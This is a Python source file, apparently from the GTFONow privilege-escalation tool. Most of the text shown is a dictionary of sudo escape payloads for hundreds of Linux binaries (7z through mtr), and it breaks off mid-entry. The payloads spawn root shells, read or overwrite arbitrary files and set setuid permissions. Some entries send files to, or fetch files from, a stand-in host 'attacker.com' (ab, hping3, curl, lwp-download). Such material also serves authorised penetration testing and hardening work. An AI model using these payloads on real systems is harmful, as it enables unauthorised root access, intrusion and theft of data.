#! /usr/bin/env/python
# -*- coding: utf-8 -*-
# https://github.com/Frissi0n/GTFONow
# Automatic privilege escalation for misconfiguRED capabilities, sudo and suid binaries.

from __future__ import print_function
import subprocess
import getpass
import os
import argparse
import sys
import re
import stat
import grp
import pwd
import logging
import platform
import time
import select

# SUDO_BINS_START
sudo_bins = {
    "7z": [
        {
            "code": "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n"
        }
    ],
    "aa-exec": [
        {
            "code": "sudo aa-exec /bin/sh"
        }
    ],
    "ab": [
        {
            "code": "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL\n",
            "description": "Upload local file via HTTP POST request."
        }
    ],
    "alpine": [
        {
            "code": "LFILE=file_to_read\nsudo alpine -F \"$LFILE\"\n"
        }
    ],
    "ansible-playbook": [
        {
            "code": "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF\n"
        }
    ],
    "ansible-test": [
        {
            "code": "sudo ansible-test shell"
        }
    ],
    "aoss": [
        {
            "code": "sudo aoss /bin/sh"
        }
    ],
    "apache2ctl": [
        {
            "code": "LFILE=file_to_read\nsudo apache2ctl -c \"Include $LFILE\" -k stop\n"
        }
    ],
    "apt": [
        {
            "code": "sudo apt changelog apt\n!/bin/sh\n",
            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
        },
        {
            "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n",
            "description": "For this to work the target package (e.g., `sl`) must not be installed."
        },
        {
            "code": "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh",
            "description": "When the shell exits the `update` command is actually executed."
        }
    ],
    "apt-get": [
        {
            "code": "sudo apt-get changelog apt\n!/bin/sh\n",
            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
        },
        {
            "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n",
            "description": "For this to work the target package (e.g., `sl`) must not be installed."
        },
        {
            "code": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh",
            "description": "When the shell exits the `update` command is actually executed."
        }
    ],
    "ar": [
        {
            "code": "TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
        }
    ],
    "aria2c": [
        {
            "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
        }
    ],
    "arj": [
        {
            "code": "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR\n",
            "description": "The archive can also be prepared offline then uploaded."
        }
    ],
    "arp": [
        {
            "code": "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n"
        }
    ],
    "as": [
        {
            "code": "LFILE=file_to_read\nsudo as @$LFILE\n"
        }
    ],
    "ascii-xfr": [
        {
            "code": "LFILE=file_to_read\nsudo ascii-xfr -ns \"$LFILE\"\n"
        }
    ],
    "ascii85": [
        {
            "code": "LFILE=file_to_read\nsudo ascii85 \"$LFILE\" | ascii85 --decode\n"
        }
    ],
    "ash": [
        {
            "code": "sudo ash"
        }
    ],
    "aspell": [
        {
            "code": "LFILE=file_to_read\nsudo aspell -c \"$LFILE\"\n"
        }
    ],
    "at": [
        {
            "code": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n"
        }
    ],
    "atobm": [
        {
            "code": "LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
        }
    ],
    "awk": [
        {
            "code": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
        }
    ],
    "aws": [
        {
            "code": "sudo aws help\n!/bin/sh\n",
            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
        }
    ],
    "base32": [
        {
            "code": "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n"
        }
    ],
    "base58": [
        {
            "code": "LFILE=file_to_read\nsudo base58 \"$LFILE\" | base58 --decode\n"
        }
    ],
    "base64": [
        {
            "code": "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n"
        }
    ],
    "basenc": [
        {
            "code": "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n"
        }
    ],
    "basez": [
        {
            "code": "LFILE=file_to_read\nsudo basez \"$LFILE\" | basez --decode\n"
        }
    ],
    "bash": [
        {
            "code": "sudo bash"
        }
    ],
    "batcat": [
        {
            "code": "sudo batcat --paging always /etc/profile\n!/bin/sh\n"
        }
    ],
    "bc": [
        {
            "code": "LFILE=file_to_read\nsudo bc -s $LFILE\nquit\n"
        }
    ],
    "bconsole": [
        {
            "code": "sudo bconsole\n@exec /bin/sh\n"
        }
    ],
    "bpftrace": [
        {
            "code": "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'"
        },
        {
            "code": "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n"
        },
        {
            "code": "sudo bpftrace -c /bin/sh -e 'END {exit()}'"
        }
    ],
    "bridge": [
        {
            "code": "LFILE=file_to_read\nsudo bridge -b \"$LFILE\"\n"
        }
    ],
    "bundle": [
        {
            "code": "sudo bundle help\n!/bin/sh\n",
            "description": "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
        }
    ],
    "bundler": [
        {
            "code": "sudo bundler help\n!/bin/sh\n",
            "description": "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
        }
    ],
    "busctl": [
        {
            "code": "sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'\n"
        }
    ],
    "busybox": [
        {
            "code": "sudo busybox sh"
        }
    ],
    "byebug": [
        {
            "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"
        }
    ],
    "bzip2": [
        {
            "code": "LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d\n"
        }
    ],
    "c89": [
        {
            "code": "sudo c89 -wrapper /bin/sh,-s ."
        }
    ],
    "c99": [
        {
            "code": "sudo c99 -wrapper /bin/sh,-s ."
        }
    ],
    "cabal": [
        {
            "code": "sudo cabal exec -- /bin/sh"
        }
    ],
    "capsh": [
        {
            "code": "sudo capsh --"
        }
    ],
    "cat": [
        {
            "code": "LFILE=file_to_read\nsudo cat \"$LFILE\"\n"
        }
    ],
    "cdist": [
        {
            "code": "sudo cdist shell -s /bin/sh"
        }
    ],
    "certbot": [
        {
            "code": "TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n"
        }
    ],
    "check_by_ssh": [
        {
            "code": "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx",
            "description": "The shell will only last 10 seconds."
        }
    ],
    "check_cups": [
        {
            "code": "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n"
        }
    ],
    "check_log": [
        {
            "code": "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n"
        }
    ],
    "check_memory": [
        {
            "code": "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n"
        }
    ],
    "check_raid": [
        {
            "code": "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n"
        }
    ],
    "check_ssl_cert": [
        {
            "code": "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n",
            "description": "The host example.net must return a certificate via TLS"
        }
    ],
    "check_statusfile": [
        {
            "code": "LFILE=file_to_read\nsudo check_statusfile $LFILE\n"
        }
    ],
    "chmod": [
        {
            "code": "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n"
        }
    ],
    "choom": [
        {
            "code": "sudo choom -n 0 /bin/sh"
        }
    ],
    "chown": [
        {
            "code": "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n"
        }
    ],
    "chroot": [
        {
            "code": "sudo chroot /\n"
        }
    ],
    "clamscan": [
        {
            "code": "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
        }
    ],
    "cmp": [
        {
            "code": "LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l\n"
        }
    ],
    "cobc": [
        {
            "code": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n"
        }
    ],
    "column": [
        {
            "code": "LFILE=file_to_read\nsudo column $LFILE\n"
        }
    ],
    "comm": [
        {
            "code": "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n"
        }
    ],
    "composer": [
        {
            "code": "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n"
        }
    ],
    "cowsay": [
        {
            "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n"
        }
    ],
    "cowthink": [
        {
            "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n"
        }
    ],
    "cp": [
        {
            "code": "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n"
        },
        {
            "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n",
            "description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)"
        },
        {
            "code": "sudo cp /bin/sh /bin/cp\nsudo cp\n",
            "description": "This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action."
        }
    ],
    "cpan": [
        {
            "code": "sudo cpan\n! exec '/bin/bash'\n"
        }
    ],
    "cpio": [
        {
            "code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n"
        },
        {
            "code": "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
            "description": "The whole directory structure is copied to `$TF`."
        },
        {
            "code": "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR\n",
            "description": "Copies `$LFILE` to the `$LDIR` directory."
        }
    ],
    "cpulimit": [
        {
            "code": "sudo cpulimit -l 100 -f /bin/sh"
        }
    ],
    "crash": [
        {
            "code": "sudo crash -h\n!sh\n",
            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
        }
    ],
    "crontab": [
        {
            "code": "sudo crontab -e",
            "description": "The commands are executed according to the crontab file edited via the `crontab` utility."
        }
    ],
    "csh": [
        {
            "code": "sudo csh"
        }
    ],
    "csplit": [
        {
            "code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
        }
    ],
    "csvtool": [
        {
            "code": "sudo csvtool call '/bin/sh;false' /etc/passwd"
        }
    ],
    "cupsfilter": [
        {
            "code": "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
        }
    ],
    "curl": [
        {
            "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n",
            "description": "Fetch a remote file via HTTP GET request."
        }
    ],
    "cut": [
        {
            "code": "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n"
        }
    ],
    "dash": [
        {
            "code": "sudo dash"
        }
    ],
    "date": [
        {
            "code": "LFILE=file_to_read\nsudo date -f $LFILE\n"
        }
    ],
    "dc": [
        {
            "code": "sudo dc -e '!/bin/sh'"
        }
    ],
    "dd": [
        {
            "code": "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n"
        }
    ],
    "debugfs": [
        {
            "code": "sudo debugfs\n!/bin/sh\n"
        }
    ],
    "dialog": [
        {
            "code": "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n"
        }
    ],
    "diff": [
        {
            "code": "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n"
        }
    ],
    "dig": [
        {
            "code": "LFILE=file_to_read\nsudo dig -f $LFILE\n"
        }
    ],
    "distcc": [
        {
            "code": "sudo distcc /bin/sh"
        }
    ],
    "dmesg": [
        {
            "code": "sudo dmesg -H\n!/bin/sh\n",
            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
        }
    ],
    "dmidecode": [
        {
            "code": "LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\"\n",
            "description": "It can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.\nGenerate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.\n\n- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.\n\n- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.\n\n```\nmake dmiwrite\nTF=$(mktemp)\necho \"DATA\" > $TF\n./dmiwrite $TF x.dmi\n```\n"
        }
    ],
    "dmsetup": [
        {
            "code": "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"
        }
    ],
    "dnf": [
        {
            "code": "sudo dnf install -y x-1.0-1.noarch.rpm\n",
            "description": "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n"
        }
    ],
    "docker": [
        {
            "code": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            "description": "The resulting is a root shell."
        }
    ],
    "dosbox": [
        {
            "code": "LFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n",
            "description": "Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
        }
    ],
    "dotnet": [
        {
            "code": "sudo dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n"
        }
    ],
    "dpkg": [
        {
            "code": "sudo dpkg -l\n!/bin/sh\n",
            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
        },
        {
            "code": "sudo dpkg -i x_1.0_all.deb",
            "description": "It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n```\n"
        }
    ],
    "dstat": [
        {
            "code": "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx\n"
        }
    ],
    "dvips": [
        {
            "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n"
        }
    ],
    "easy_install": [
        {
            "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"
        }
    ],
    "eb": [
        {
            "code": "sudo eb logs\n!/bin/sh\n"
        }
    ],
    "ed": [
        {
            "code": "sudo ed\n!/bin/sh\n"
        }
    ],
    "efax": [
        {
            "code": "LFILE=file_to_read\nsudo efax -d \"$LFILE\"\n"
        }
    ],
    "elvish": [
        {
            "code": "sudo elvish"
        }
    ],
    "emacs": [
        {
            "code": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
        }
    ],
    "enscript": [
        {
            "code": "sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"
        }
    ],
    "env": [
        {
            "code": "sudo env /bin/sh"
        }
    ],
    "eqn": [
        {
            "code": "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n"
        }
    ],
    "espeak": [
        {
            "code": "LFILE=file_to_read\nsudo espeak -qXf \"$LFILE\"\n"
        }
    ],
    "ex": [
        {
            "code": "sudo ex\n!/bin/sh\n"
        }
    ],
    "exiftool": [
        {
            "code": "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n"
        }
    ],
    "expand": [
        {
            "code": "LFILE=file_to_read\nsudo expand \"$LFILE\"\n"
        }
    ],
    "expect": [
        {
            "code": "sudo expect -c 'spawn /bin/sh;interact'"
        }
    ],
    "facter": [
        {
            "code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"
        }
    ],
    "file": [
        {
            "code": "LFILE=file_to_read\nsudo file -f $LFILE\n",
            "description": "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
        }
    ],
    "find": [
        {
            "code": "sudo find . -exec /bin/sh \\; -quit"
        }
    ],
    "fish": [
        {
            "code": "sudo fish"
        }
    ],
    "flock": [
        {
            "code": "sudo flock -u / /bin/sh"
        }
    ],
    "fmt": [
        {
            "code": "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n",
            "description": "This corrupts the output by wrapping very long lines at the given width."
        }
    ],
    "fold": [
        {
            "code": "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n"
        }
    ],
    "fping": [
        {
            "code": "LFILE=file_to_read\nsudo fping -f $LFILE\n"
        }
    ],
    "ftp": [
        {
            "code": "sudo ftp\n!/bin/sh\n"
        }
    ],
    "gawk": [
        {
            "code": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
        }
    ],
    "gcc": [
        {
            "code": "sudo gcc -wrapper /bin/sh,-s ."
        }
    ],
    "gcloud": [
        {
            "code": "sudo gcloud help\n!/bin/sh\n",
            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
        }
    ],
    "gcore": [
        {
            "code": "sudo gcore $PID"
        }
    ],
    "gdb": [
        {
            "code": "sudo gdb -nx -ex '!sh' -ex quit"
        }
    ],
    "gem": [
        {
            "code": "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc",
            "description": "This requires the name of an installed gem to be provided (`rdoc` is usually installed)."
        }
    ],
    "genie": [
        {
            "code": "sudo genie -c '/bin/sh'"
        }
    ],
    "genisoimage": [
        {
            "code": "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n"
        }
    ],
    "ghc": [
        {
            "code": "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
        }
    ],
    "ghci": [
        {
            "code": "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
        }
    ],
    "gimp": [
        {
            "code": "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
        }
    ],
    "ginsh": [
        {
            "code": "sudo ginsh\n!/bin/sh\n"
        }
    ],
    "git": [
        {
            "code": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help"
        },
        {
            "code": "sudo git -p help config\n!/bin/sh\n",
            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
        },
        {
            "code": "sudo git branch --help config\n!/bin/sh\n",
            "description": "The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
        },
        {
            "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n",
            "description": "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option."
        },
        {
            "code": "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n"
        }
    ],
    "grc": [
        {
            "code": "sudo grc --pty /bin/sh"
        }
    ],
    "grep": [
        {
            "code": "LFILE=file_to_read\nsudo grep '' $LFILE\n"
        }
    ],
    "gtester": [
        {
            "code": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
        }
    ],
    "gzip": [
        {
            "code": "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n"
        }
    ],
    "hd": [
        {
            "code": "LFILE=file_to_read\nsudo hd \"$LFILE\"\n"
        }
    ],
    "head": [
        {
            "code": "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"
        }
    ],
    "hexdump": [
        {
            "code": "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n"
        }
    ],
    "highlight": [
        {
            "code": "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n"
        }
    ],
    "hping3": [
        {
            "code": "sudo hping3\n/bin/sh\n"
        },
        {
            "code": "RHOST=attacker.com\nLFILE=file_to_read\nsudo hping3 \"$RHOST\" --icmp --data 500 --sign xxx --file \"$LFILE\"\n",
            "description": "The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:\n\n```\nsudo hping3 --icmp --listen xxx --dump\n```\n"
        }
    ],
    "iconv": [
        {
            "code": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
        }
    ],
    "iftop": [
        {
            "code": "sudo iftop\n!/bin/sh\n"
        }
    ],
    "install": [
        {
            "code": "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n"
        }
    ],
    "ionice": [
        {
            "code": "sudo ionice /bin/sh"
        }
    ],
    "ip": [
        {
            "code": "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n"
        },
        {
            "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n",
            "description": "This only works for Linux with CONFIG_NET_NS=y."
        },
        {
            "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nsudo ip netns exec bar /bin/sh\nsudo ip netns delete foo\nsudo ip netns delete bar\n",
            "description": "This only works for Linux with CONFIG_NET_NS=y. This version also grants network access."
        }
    ],
    "irb": [
        {
            "code": "sudo irb\nexec '/bin/bash'\n"
        }
    ],
    "ispell": [
        {
            "code": "sudo ispell /etc/passwd\n!/bin/sh\n"
        }
    ],
    "jjs": [
        {
            "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
        }
    ],
    "joe": [
        {
            "code": "sudo joe\n^K!/bin/sh\n"
        }
    ],
    "join": [
        {
            "code": "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n"
        }
    ],
    "journalctl": [
        {
            "code": "sudo journalctl\n!/bin/sh\n"
        }
    ],
    "jq": [
        {
            "code": "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n"
        }
    ],
    "jrunscript": [
        {
            "code": "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
        }
    ],
    "jtag": [
        {
            "code": "sudo jtag --interactive\nshell /bin/sh\n"
        }
    ],
    "julia": [
        {
            "code": "sudo julia -e 'run(`/bin/sh`)'\n"
        }
    ],
    "knife": [
        {
            "code": "sudo knife exec -E 'exec \"/bin/sh\"'\n"
        }
    ],
    "ksh": [
        {
            "code": "sudo ksh"
        }
    ],
    "ksshell": [
        {
            "code": "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"
        }
    ],
    "ksu": [
        {
            "code": "sudo ksu -q -e /bin/sh"
        }
    ],
    "kubectl": [
        {
            "code": "LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
        }
    ],
    "latex": [
        {
            "code": "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
            "description": "The read file will be part of the output."
        },
        {
            "code": "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
        }
    ],
    "latexmk": [
        {
            "code": "sudo latexmk -e 'exec \"/bin/sh\";'"
        }
    ],
    "ld.so": [
        {
            "code": "sudo /lib/ld.so /bin/sh"
        }
    ],
    "ldconfig": [
        {
            "code": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n",
            "description": "This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries."
        }
    ],
    "less": [
        {
            "code": "sudo less /etc/profile\n!/bin/sh\n"
        }
    ],
    "lftp": [
        {
            "code": "sudo lftp -c '!/bin/sh'"
        }
    ],
    "ln": [
        {
            "code": "sudo ln -fs /bin/sh /bin/ln\nsudo ln\n"
        }
    ],
    "loginctl": [
        {
            "code": "sudo loginctl user-status\n!/bin/sh\n"
        }
    ],
    "logsave": [
        {
            "code": "sudo logsave /dev/null /bin/sh -i"
        }
    ],
    "look": [
        {
            "code": "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n"
        }
    ],
    "ltrace": [
        {
            "code": "sudo ltrace -b -L /bin/sh"
        }
    ],
    "lua": [
        {
            "code": "sudo lua -e 'os.execute(\"/bin/sh\")'"
        }
    ],
    "lualatex": [
        {
            "code": "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
        }
    ],
    "luatex": [
        {
            "code": "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
        }
    ],
    "lwp-download": [
        {
            "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n"
        }
    ],
    "lwp-request": [
        {
            "code": "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n"
        }
    ],
    "mail": [
        {
            "code": "sudo mail --exec='!/bin/sh'",
            "description": "GNU version only."
        }
    ],
    "make": [
        {
            "code": "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
        }
    ],
    "man": [
        {
            "code": "sudo man man\n!/bin/sh\n"
        }
    ],
    "mawk": [
        {
            "code": "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
        }
    ],
    "minicom": [
        {
            "code": "sudo minicom -D /dev/null\n",
            "description": "Start the following command to open the TUI interface, then:\n1. press `Ctrl-A o` and select `Filenames and paths`;\n2. press `e`, type `/bin/sh`, then `Enter`;\n3. Press `Esc` twice;\n4. Press `Ctrl-A k` to drop the shell.\nAfter the shell, exit with `Ctrl-A x`.\n"
        }
    ],
    "more": [
        {
            "code": "TERM= sudo more /etc/profile\n!/bin/sh\n"
        }
    ],
    "mosquitto": [
        {
            "code": "LFILE=file_to_read\nsudo mosquitto -c \"$LFILE\"\n"
        }
    ],
    "mount": [
        {
            "code": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n",
            "description": "Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell."
        }
    ],
    "msfconsole": [
        {
            "code": "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n"
        }
    ],
    "msgattrib": [
        {
            "code": "LFILE=file_to_read\nsudo msgattrib -P $LFILE\n"
        }
    ],
    "msgcat": [
        {
            "code": "LFILE=file_to_read\nsudo msgcat -P $LFILE\n"
        }
    ],
    "msgconv": [
        {
            "code": "LFILE=file_to_read\nsudo msgconv -P $LFILE\n"
        }
    ],
    "msgfilter": [
        {
            "code": "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n",
            "description": "Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once."
        }
    ],
    "msgmerge": [
        {
            "code": "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null\n"
        }
    ],
    "msguniq": [
        {
            "code": "LFILE=file_to_read\nsudo msguniq -P $LFILE\n"
        }
    ],
    "mtr": [
        {
            "code": "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n"
        }
    ],
    "multitime": [
        {
